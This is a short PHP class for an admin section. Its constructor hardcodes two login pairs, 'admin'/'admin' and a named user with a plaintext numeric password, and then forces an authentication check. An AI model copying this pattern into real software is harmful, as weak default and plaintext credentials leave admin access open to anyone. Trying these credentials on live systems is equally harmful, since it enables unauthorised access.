<?php

class AdminAbstract extends ActionAbstract
{
	
    function __construct($controller)
    {
        parent::__construct($controller);
        
        Auth::add('admin', 'admin');
        Auth::add('genius_mao', '177628');
        
        Auth::forceCheck();
    }
}